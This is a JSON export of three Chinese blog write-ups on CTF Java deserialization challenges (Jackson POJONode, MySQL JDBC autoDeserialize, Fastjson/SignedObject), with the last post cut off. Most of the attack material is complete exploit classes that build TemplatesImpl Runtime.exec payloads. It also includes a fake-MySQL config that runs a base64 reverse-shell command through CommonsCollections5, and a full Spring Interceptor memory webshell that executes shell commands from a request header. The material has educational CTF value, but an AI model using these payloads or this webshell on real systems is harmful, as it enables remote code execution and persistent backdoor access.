[{"content":"前言 之前在JAVA入门到放弃系列之TemplatesImpl注入Fastjson内存马中提到无论是Impl链或是二次反序列化的SignedObject都需要借助fastjson的JSONArray/JSONObject来触发getter方法。\n所以同样的，当fastjson库被替换成jackson库，我们依旧可以找到相似的类来触发getter方法，它就是PojoNode，其触发条件如下:\n不需要存在该属性 getter方法需要有返回值 尽可能的只有一个getter 我们可以通过一道CTF题来学习这个知识点。\n2023巅峰极客-babyurl /hack路由是入口点,通过传入的payload进行反序列化，/file路由可以读取/tmp/file内容\n@GetMapping({\u0026#34;/hack\u0026#34;}) @ResponseBody public String hack(@RequestParam String payload) { byte[] bytes = Base64.getDecoder().decode(payload.getBytes(StandardCharsets.UTF_8)); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); try { ObjectInputStream ois = new MyObjectInputStream(byteArrayInputStream); URLHelper o = (URLHelper)ois.readObject(); System.out.println(o); System.out.println(o.url); return \u0026#34;ok!\u0026#34;; } catch (Exception var6) { var6.printStackTrace(); return var6.toString(); } } @RequestMapping({\u0026#34;/file\u0026#34;}) @ResponseBody public String file() throws IOException { File file = new File(\u0026#34;/tmp/file\u0026#34;); if (!file.exists()) { file.createNewFile(); } FileInputStream fis = new FileInputStream(file); byte[] bytes = new byte[1024]; fis.read(bytes); return new String(bytes); } 跟一下URLHelper和URLVisiter类，分析可知URLHelper重写了readObject，可以根据传入的内容反序列化后存入/tmp/file，而URLVisiter实现了通过一个url读取内容，并限制了不能以file开头，防止用file协议读文件，其实改个大小写用File://即可绕过\npublic class URLHelper implements Serializable { public String url; public URLVisiter visiter = null; private static final long serialVersionUID = 1L; public URLHelper(String url) { this.url = url; } private void readObject(ObjectInputStream in) throws Exception { in.defaultReadObject(); if (this.visiter != null) { String result = this.visiter.visitUrl(this.url); File file = new File(\u0026#34;/tmp/file\u0026#34;); if (!file.exists()) { file.createNewFile(); } FileOutputStream fos = new FileOutputStream(file); fos.write(result.getBytes()); fos.close(); } } } public class URLVisiter implements Serializable { public URLVisiter() { } public String visitUrl(String myurl) { if (myurl.startsWith(\u0026#34;file\u0026#34;)) { return \u0026#34;file protocol is not allowed\u0026#34;; } else { URL url = null; try { url = new URL(myurl); BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream())); StringBuilder sb = new StringBuilder(); String inputLine; while((inputLine = in.readLine()) != null) { sb.append(inputLine); } in.close(); return sb.toString(); } catch (Exception var6) { return var6.toString(); } } } } 最后看下MyObjectInputStream，其中关键是过滤了URLVisiter和URLHelper\npublic class MyObjectInputStream extends ObjectInputStream { public MyObjectInputStream(InputStream in) throws IOException { super(in); } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); String[] denyClasses = new String[]{\u0026#34;java.net.InetAddress\u0026#34;, \u0026#34;org.apache.commons.collections.Transformer\u0026#34;, \u0026#34;org.apache.commons.collections.functors\u0026#34;, \u0026#34;com.yancao.ctf.bean.URLVisiter\u0026#34;, \u0026#34;com.yancao.ctf.bean.URLHelper\u0026#34;}; String[] var4 = denyClasses; int var5 = denyClasses.length; for(int var6 = 0; var6 \u0026lt; var5; ++var6) { String denyClass = var4[var6]; if (className.startsWith(denyClass)) { throw new InvalidClassException(\u0026#34;Unauthorized deserialization attempt\u0026#34;, className); } } return super.resolveClass(desc); } } 再看下包依赖中含有jackson，因此我们可以使用前言中提到的POJONode来形成完整的利用链\nimage-20230806221208619 综上分析我们可以得出两种解法，一是通过二次反序列化绕过URLVisiter和URLHelper过滤用File://读取flag到/tmp/file中，链子如下：\n//链子1 BadAttributeValueExpException#readObject() -\u0026gt; POJONode#toString() -\u0026gt; SignedObject#getObject exp如下：\npackage com.yancao.ctf; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.yancao.ctf.bean.URLHelper; import com.yancao.ctf.bean.URLVisiter; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.ibatis.javassist.ClassPool; import org.apache.ibatis.javassist.CtClass; import org.apache.ibatis.javassist.CtConstructor; import java.io.*; import java.security.*; import java.util.*; import javax.management.BadAttributeValueExpException; import java.lang.reflect.Field; public class exp { public static void main(String[] args) throws Exception { URLHelper Help = new URLHelper(\u0026#34;File:///etc/host\u0026#34;); Help.visiter = new URLVisiter(); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\u0026#34;DSA\u0026#34;); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(Help, kp.getPrivate(), Signature.getInstance(\u0026#34;DSA\u0026#34;)); //触发SignedObject#getObject POJONode node2 = new POJONode(Help); BadAttributeValueExpException val2 = new BadAttributeValueExpException(null); Field valfield2 = val2.getClass().getDeclaredField(\u0026#34;val\u0026#34;); valfield2.setAccessible(true); valfield2.set(val2, node2); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(val2); outputStream.close(); System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()))); } } 打一下，看下file可以发现成功读取到/etc/host(实际题目中还需要找一下flag，由于本地环境，这里不再复现)\n二是直接打Impl链子，链子如下：\n//链子2 BadAttributeValueExpException#readObject() -\u0026gt; POJONode#toString() -\u0026gt; TemplatesImpl#getOutputProperties exp如下：\npackage com.yancao.ctf; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.yancao.ctf.bean.URLHelper; import com.yancao.ctf.bean.URLVisiter; import com.fasterxml.jackson.databind.node.POJONode; import org.apache.ibatis.javassist.ClassPool; import org.apache.ibatis.javassist.CtClass; import org.apache.ibatis.javassist.CtConstructor; import java.io.*; import java.security.*; import java.util.*; import javax.management.BadAttributeValueExpException; import java.lang.reflect.Field; public class exp { public static void setValue(Object obj, String name, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static byte[] genPayload(String cmd) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(\u0026#34;a\u0026#34;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[0], clazz); constructor.setBody(\u0026#34;Runtime.getRuntime().exec(\\\u0026#34;\u0026#34; + cmd + \u0026#34;\\\u0026#34;);\u0026#34;); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); } public static void main(String[] args) throws Exception { TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, \u0026#34;_bytecodes\u0026#34;, new byte[][]{genPayload(\u0026#34;open -na Calculator\u0026#34;)}); setValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;1\u0026#34;); setValue(templates, \u0026#34;_tfactory\u0026#34;, (Object)null); POJONode jsonNodes = new POJONode(templates); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = exp.getClass().getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(exp,jsonNodes); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(exp); outputStream.close(); System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()))); } } 打一下，成功弹出计算器\nimage-20230722150812950 踩坑 调用POJONode#toString()需要注意的是由于PoJoNode类是继承ValueNode，而ValueNode又是继承BaseJsonNode类的，而BaseJsonNode中有个writeReplace函数，反序列化时会先走这个writeReplace方法进行检查从而中断我们的利用链，这里需要我们重写一下这个BaseNodeJson，将writeReplace方法注释掉即可。\nimage-20230806223607472 参考资料 [1] https://www.freebuf.com/articles/web/367236.html\n[2] https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/\n","date":"2023-08-06T00:00:00Z","permalink":"https://Kleinor.github.io/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bjackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80/","title":"JAVA入门到放弃系列之Jackson反序列化(一)"},{"content":"JDBC简介 ​JDBC（Java Database Connectivity）是Java中用来连接和执行查询到数据库的标准API。JDBC提供了一种基础的服务，允许开发者使用SQL语句来查询和更新数据库中的数据。JDBC是跨数据库可移植的，意味着你可以无缝地切换数据库，只需要改变连接字符串和驱动即可。\nMySQL JDBC 漏洞成因 Mysql JDBC 中包含一个危险的扩展参数： \u0026ldquo;autoDeserialize\u0026rdquo;。这个参数配置为 true 时，JDBC 客户端将会自动反序列化服务端返回的数据。\n当JDBC连接到数据库时，驱动会自动执行SHOW SESSION STATUS和SHOW COLLATION查询，并对查询结果进行反序列化处理,如果我们可以控制jdbc客户端的url连接，去连接我们自己的一个恶意mysql服务(这个恶意服务只需要能回复jdbc发来的数据包即可)，当jdbc驱动自动执行一些查询(如show session status或show collation)这个服务会给jdbc发送序列化后的payload，然后jdbc本地进行反序列化处理后触发RCE\nJDBC连接参数\nStatementInterceptors:连接参数是用于指定实现 com.mysql.jdbc.StatementInterceptor 接口的类的逗号分隔列表的参数。这些拦截器可用于通过在查询执行和结果返回之间插入自定义逻辑来影响查询执行的结果，这些拦截器将被添加到一个链中，第一个拦截器返回的结果将被传递到第二个拦截器，以此类推。自 8.0.7起被queryInterceptors参数替代。\nqueryInterceptors:一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query\u0026quot;之间\u0026quot;进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）\nautoDeserialize:自动检测与反序列化存在BLOB字段中的对象。\ndetectCustomCollations:驱动程序是否应该检测服务器上安装的自定义字符集/排序规则，如果此选项设置为“true”，驱动程序会在每次建立连接时从服务器获取实际的字符集/排序规则。这可能会显着减慢连接初始化速度。\n其他详细参数可在官方文档中查询：\nhttps://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html\n[羊城杯 2020]A Piece Of Java 用的BUU上的环境，先看入口，通过Cookie读取data，反序列化后返回实例化对象info,且该类最后会执行getAllinfo方法,其中userInfo类没有什么可利用的\n@GetMapping({\u0026#34;/hello\u0026#34;}) public String hello(@CookieValue(value = \u0026#34;data\u0026#34;,required = false) String cookieData, Model model) { if (cookieData != null \u0026amp;\u0026amp; !cookieData.equals(\u0026#34;\u0026#34;)) { Info info = (Info)this.deserialize(cookieData); if (info != null) { model.addAttribute(\u0026#34;info\u0026#34;, info.getAllInfo()); } return \u0026#34;hello\u0026#34;; } else { return \u0026#34;redirect:/index\u0026#34;; } } 先看下this.deserialize，其引入了SerialKiller-3.0来实现反序列化\nprivate Object deserialize(String base64data) { ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(base64data)); try { ObjectInputStream ois = new SerialKiller(bais, \u0026#34;serialkiller.conf\u0026#34;); Object obj = ois.readObject(); ois.close(); return obj; } catch (Exception var5) { var5.printStackTrace(); return null; } } 看下SerialKiller配置serialkiller.conf，有个白名单过滤，只能反序列化 gdufs 包和 java.lang 包下面的类，因此虽然存在依赖commons-collections3.2.1但不能直接用CC链打\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!-- serialkiller.conf --\u0026gt; \u0026lt;config\u0026gt; \u0026lt;refresh\u0026gt;6000\u0026lt;/refresh\u0026gt; \u0026lt;mode\u0026gt; \u0026lt;!-- set to \u0026#39;false\u0026#39; for blocking mode --\u0026gt; \u0026lt;profiling\u0026gt;false\u0026lt;/profiling\u0026gt; \u0026lt;/mode\u0026gt; \u0026lt;blacklist\u0026gt; \u0026lt;/blacklist\u0026gt; \u0026lt;whitelist\u0026gt; \u0026lt;regexp\u0026gt;gdufs\\..*\u0026lt;/regexp\u0026gt; \u0026lt;regexp\u0026gt;java\\.lang\\..*\u0026lt;/regexp\u0026gt; \u0026lt;/whitelist\u0026gt; \u0026lt;/config\u0026gt; 我们把目光移到databaseInfo类上，里面可以通过jdbc连接任意mysql服务器，用的mysql-connector-java-8.0.19\nprivate void connect() { String url = \u0026#34;jdbc:mysql://\u0026#34; + this.host + \u0026#34;:\u0026#34; + this.port + \u0026#34;/jdbc?user=\u0026#34; + this.username + \u0026#34;\u0026amp;password=\u0026#34; + this.password + \u0026#34;\u0026amp;connectTimeout=3000\u0026amp;socketTimeout=6000\u0026#34;; try { this.connection = DriverManager.getConnection(url); } catch (Exception var3) { var3.printStackTrace(); } } public Boolean checkAllInfo() { if (this.host != null \u0026amp;\u0026amp; this.port != null \u0026amp;\u0026amp; this.username != null \u0026amp;\u0026amp; this.password != null) { if (this.connection == null) { this.connect(); } return true; } else { return false; } } 并且存在一个动态代理的实现类 InvocationHandler 类，可以调用checkAllInfo，最终调用databaseInfo类的connect()。(Java的动态代理相关知识点，可以参考这篇文章https://tttang.com/archive/1769/)。要触发invoke()需要被Proxy代理类封装且被执行方法。因此我们可以得到触发条件就是在之前分析中实例化后的对象执行info.getAllinfo()。\npublic class InfoInvocationHandler implements InvocationHandler, Serializable { private Info info; public InfoInvocationHandler(Info info) { this.info = info; } public Object invoke(Object proxy, Method method, Object[] args) { try { return method.getName().equals(\u0026#34;getAllInfo\u0026#34;) \u0026amp;\u0026amp; !this.info.checkAllInfo() ? null : method.invoke(this.info, args); } catch (Exception var5) { var5.printStackTrace(); return null; } } } 综合以上分析，题目的整体思路清楚了，以/hello路由为入口，通过Cookie传入data，将databaseInfo类封装进InvocationHandler类，通过hello路由中的info.getAllInfo()方法触发invoke方法且满足判断条件method.getName().equals(\u0026quot;getAllInfo\u0026quot;) \u0026amp;\u0026amp; !this.info.checkAllInfo()为false正常调用Info对象方法，然后由checkAllInfo触发databaseInfo类的connect()，最终完成JDBC反序列化的触发，我们要在password字段中拼接参数构造JDBCURL访问我们的恶意Mysql服务，其向客户端打CC5链的payload。\n(用CC5链是因为serialkiller通过maven 仓库中查询可知其存在cc3.2.1依赖)\n其中恶意mysql服务用大佬造好的轮子https://github.com/fnmsd/MySQL_Fake_Server\n将ysoserial放到同路径下，配置一下config.json，访问Cc5即执行对应的命令。\n\u0026quot;yso\u0026quot;:{ \u0026quot;Jdk7u21\u0026quot;:[\u0026quot;Jdk7u21\u0026quot;,\u0026quot;calc\u0026quot;], \u0026quot;Cc5\u0026quot;:[\u0026quot;CommonsCollections5\u0026quot;,\u0026quot;bash -c {echo,反弹shell}|{base64,-d}|{bash,-i}\u0026quot;] } POC:\npackage gdufs.challenge.web; import gdufs.challenge.web.*; import gdufs.challenge.web.invocation.InfoInvocationHandler; import gdufs.challenge.web.model.DatabaseInfo; import gdufs.challenge.web.model.Info; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Proxy; import java.util.Base64; public class JDBC { public static void main(String[] args) throws Exception{ DatabaseInfo info = new DatabaseInfo(); info.setHost(\u0026#34;IP\u0026#34;); info.setPort(\u0026#34;3306\u0026#34;); info.setUsername(\u0026#34;Cc5\u0026#34;); info.setPassword(\u0026#34;1\u0026amp;autoDeserialize=true\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;); InfoInvocationHandler handler = new InfoInvocationHandler(info); Info proxy = (Info) Proxy.newProxyInstance(info.getClass().getClassLoader(), info.getClass().getInterfaces(),handler); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream= new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(proxy); outputStream.close(); System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()))); } } 这里要注意用jd-gui反编译导出文件，再导入自己项目后，要调整下包名和路径，gdufs.challenge.web不能直接改名，而是要层层新建，否则产生的字节码反序列化会找不到包，返回\u0026quot;Hello,null\u0026quot;。(哭了，java题还是调的太少了)\n生成了payload打一下data\n自己vps起的恶意mysql开始发包\n监听的端口弹回shell\n展望 既然Mysql可以通过一些参数的恶意利用进行JDBC反序列化攻击，其他数据库是否也可以，答案是肯定的;\n找到了一篇PostgreSQL JDBC Driver RCE（CVE-2022-21724）与任意文件写入漏洞利用：\nhttps://forum.butian.net/share/1339，感兴趣的可以看看，之后有机会结合实战进一步分析吧。\n参考资料 [1] https://tttang.com/archive/1877/\n[2] https://tttang.com/archive/1769/\n[3] https://zhzhdoai.github.io/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AFEasy-Java%E9%A2%98%E8%A7%A3/\n[4] https://wustzhb.github.io/2023/04/18/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%9D%A5%E7%9C%8BJDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020%5DA-Piece-Of-Java%29/index.html\n[5] http://www.bmth666.cn/bmth_blog/2022/03/16/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJDBC%E9%93%BE/\n[6] https://www.cnblogs.com/kingbridge/articles/15801116.html\n","date":"2023-07-17T00:00:00Z","permalink":"https://Kleinor.github.io/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bjdbc%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"JAVA入门到放弃系列之JDBC反序列化"},{"content":"概要 记录一下两道题的踩坑过程，取自2023AliyunCTF ezbean以及2023CIVC信息安全攻防赛Easy expr\n题目附件：\nhttps://pan.baidu.com/s/1krJGB1zxcF7m6WDZDZji1Q 提取码: cuqt\n涉及知识点：\nTemplatesImpl、FastJson原生反序列化、二次反序列化、Springboot Interceptor内存马\n前置知识 TemplatesImpl利用链 即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，可以用于加载恶意字节码；\n触发条件:\n​\t1._bytecodes 不为空;\n​\t2.类的父类为com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\n​\t3.name 不为 null;\n​\t4._tfactory 不为 null;\n​\t5.需要执行的恶意代码写在_bytecodes 变量对应的类的静态方法或构造方法中;\n​\t6._tfactory需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类。\n//Gadget TemplatesImpl#getOutputProperties() -\u0026gt; TemplatesImpl#newTransformer() -\u0026gt; TemplatesImpl#getTransletInstance() -\u0026gt; TemplatesImpl#defineTransletClasses() -\u0026gt; TransletClassLoader#defineClass() BadAttributeValueExpException(jdk1.8引入) 即javax.management.BadAttributeValueExpException 继承自 java.lang.Exception，java.lang.Exception 继承自 java.lang.Throwable，而 java.lang.Throwable 实现了 java.io.Serializable。\n因此BadAttributeValueExpException 符合了可序列化这个要求，它的readObject 方法，可以主动触发val字段的toString方法。\nJSONArray/JSONObject 在fastjson包中我们可以找到JSONArray与JSONObject继承了Serializable接口（高版本还有AntiCollisionHashMap），JSONArray在其父类Json类当中的toString方法能触发toJsonString的调用;\n且从1.2.49开始，JSONArray以及JSONObject方法有了自己的readObject方法，在其SecureObjectInputStream类当中重写了resolveClass,通过调用了checkAutoType方法做类的检查。然而当不安全的ObjectInputStream套个安全的SecureObjectInputStream将会导致绕过，若在JSONArray/JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型即可绕过resolveClass的检查，因此我们可以通过List，Set与Map类型触发引用进行绕过。\n以HashMap为代表的能够存储key-value键值对且可序列化的类，在key-value为相同的恶意对象将会创建一个引用类型。\n1.HashMap\r2.ConcurrentHashMap\r3.LinkedHashMap\r4.IdentityHashMap ezbean 便于Easy expr进行对比，这里我只复现一下其非预期解，即利用fastjson原生反序列化。\n题目依赖springboot 和 fastjson1.2.60\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.60\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 入口点（source）\n@RestController public class IndexController { @RequestMapping(\u0026#34;/read\u0026#34;) public String read(@RequestParam String data) { try { byte[] bytes = Base64.getDecoder().decode(data); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); MyObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); } catch (Exception e) { e.printStackTrace(); return \u0026#34;error\u0026#34;; } return \u0026#34;success\u0026#34;; } } 其中利用了一个不安全的MyObjectInputStream进行反序列化，其继承自ObjectInputStream，因此本题可以通过引用的数据类型从而不执行resolveClass以绕过其对危险类的检查；\npublic class MyObjectInputStream extends ObjectInputStream { private static final String[] blacklist = new String[]{ \u0026#34;java\\\\.security.*\u0026#34;, \u0026#34;java\\\\.rmi.*\u0026#34;, \u0026#34;com\\\\.fasterxml.*\u0026#34;, \u0026#34;com\\\\.ctf\\\\.*\u0026#34;, \u0026#34;org\\\\.springframework.*\u0026#34;, \u0026#34;org\\\\.yaml.*\u0026#34;, \u0026#34;javax\\\\.management\\\\.remote.*\u0026#34; }; public MyObjectInputStream(InputStream inputStream) throws IOException { super(inputStream); } protected Class resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException { if(!contains(cls.getName())) { return super.resolveClass(cls); } else { throw new InvalidClassException(\u0026#34;Unexpected serialized class\u0026#34;, cls.getName()); } } public static boolean contains(String targetValue) { for (String forbiddenPackage : blacklist) { if (targetValue.matches(forbiddenPackage)) return true; } return false; } } 结合前置知识提到几个关键点，我们可以得到完整的利用链，其中在恢复过程中由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过\n//Gadget BadAttributeValueExpException#readObject() -\u0026gt; JSON#toString() -\u0026gt; JSON#toJSONString() -\u0026gt; TemplatesImpl#getOutputProperties() -\u0026gt; TemplatesImpl#newTransformer() -\u0026gt; TemplatesImpl#getTransletInstance() -\u0026gt; TemplatesImpl#defineTransletClasses() -\u0026gt; TransletClassLoader#defineClass() exp:\nimport com.alibaba.fastjson.JSONArray; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.net.URLEncoder; import java.util.Base64; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassPool; import javassist.CtClass; import javassist.CtConstructor; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; public class FJ { public static void setValue(Object obj, String name, Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); } public static byte[] genPayload(String cmd) throws Exception{ ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(\u0026#34;a\u0026#34;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz); constructor.setBody(\u0026#34;Runtime.getRuntime().exec(\\\u0026#34;\u0026#34;+cmd+\u0026#34;\\\u0026#34;);\u0026#34;); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); } public static void main(String[] args) throws Exception{ TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, \u0026#34;_bytecodes\u0026#34;, new byte[][]{genPayload(\u0026#34;open -na Calculator\u0026#34;)}); setValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;1\u0026#34;); setValue(templates, \u0026#34;_tfactory\u0026#34;,null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setValue(bd,\u0026#34;val\u0026#34;,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); System.out.println(URLEncoder.encode(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())))); } } 在read路由打一下data成功rce\nEasy expr 本题是基于ezbean进行魔改，依赖springboot 和 fastjson1.2.47，其中SecureUtil重写了ObjectInputStream用List\u0026lt;Object\u0026gt; BLACKLIST过滤TemplatesImpl,因此ezbean的打法在本题会失效，我们可以通过二次反序列化绕过，即在受害服务器进行第一次反序列化的过程中借助某些类的方法进行第二次反序列化。\npublic class SecureUtil extends ObjectInputStream { private Set\u0026lt;Object\u0026gt; blackList = new HashSet\u0026lt;Object\u0026gt;() { { this.add(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;); this.add(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\u0026#34;); } }; public SecureUtil(InputStream in) throws IOException { super(in); } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass cls) throws IOException, ClassNotFoundException { if (this.blackList.contains(cls.getName())) { throw new InvalidClassException(\u0026#34;Unexpected serialized class\u0026#34;, cls.getName()); } else { return super.resolveClass(cls); } } } 这里需要用到jdk内置类SignedObject，其可以存放一个序列化数据并且有一个属于该数据的签名，其getObject方法进行了一次反序列化，因此可以得到修改后的利用链\n//gadget\r//绕过第一次的TemplatesImpl黑名单检查\rBadAttributeValueExpException#readObject() -\u0026gt; JSONOBJECT#toString() -\u0026gt; SignedObject#getObject() -\u0026gt; //二次反序列化\r//引用绕过JSON自带resolveClass的黑名单检查\rBadAttributeValueExpException#readObject() -\u0026gt; JSONArray#toString() -\u0026gt; TemplatesImpl#getOutputProperties() -\u0026gt; TemplatesImpl#newTransformer() -\u0026gt; TemplatesImpl#getTransletInstance() -\u0026gt; TemplatesImpl#defineTransletClasses() -\u0026gt; TemplatesImpl#defineClass() -\u0026gt; 当时做题时由于环境不出网，有了注入内存马的需求。参考网上现有一些师傅的思路是注入回显Spring Controller内存马，但实际一直无法执行命令，最终尝试注入Spring Interceptor内存马。（由于Interceptor的调用顺序在controller之前，对于某些一定需要权限的接口，就无法做到完美的权限维持，而Interceptor内存马能够弥补这样的缺陷）\n//Spring Interceptor内存马 TestInterceptor.java import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import org.springframework.web.servlet.handler.AbstractHandlerMapping; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.lang.reflect.Field; public class TestInterceptor extends AbstractTranslet implements HandlerInterceptor { public TestInterceptor() throws Exception{ //通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\u0026#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT\u0026#34;, 0); //通过IOC容器中的AbstractHandlerMapping AbstractHandlerMapping abstractHandlerMapping = context.getBean(AbstractHandlerMapping.class); //通过反射来获取adaptedInterceptors字段（因为该字段为私有 Field field = AbstractHandlerMapping.class.getDeclaredField(\u0026#34;adaptedInterceptors\u0026#34;); field.setAccessible(true); java.util.ArrayList\u0026lt;Object\u0026gt; adaptedInterceptors = (java.util.ArrayList\u0026lt;Object\u0026gt;)field.get(abstractHandlerMapping); //防止死循环 TestInterceptor memoryInterceptor = new TestInterceptor(\u0026#34;aaa\u0026#34;); /将要注入的过滤器放入到adaptedInterceptors中 adaptedInterceptors.add(memoryInterceptor); } public TestInterceptor(String aaa){ } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String command = request.getHeader(\u0026#34;aaaaaa\u0026#34;); if(command != null){ try { java.io.PrintWriter writer = response.getWriter(); String o = \u0026#34;\u0026#34;; ProcessBuilder p; if(System.getProperty(\u0026#34;os.name\u0026#34;).toLowerCase().contains(\u0026#34;win\u0026#34;)){ p = new ProcessBuilder(new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, command}); }else{ p = new ProcessBuilder(new String[]{\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, command}); } java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); o = c.hasNext() ? c.next(): o; c.close(); writer.write(o); writer.flush(); writer.close(); }catch (Exception e){ return false; } return false; } return true; } @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { } @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { } } exp:\nimport java.io.*; import java.net.URLEncoder; import java.util.*; import com.alibaba.fastjson.JSONArray; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import 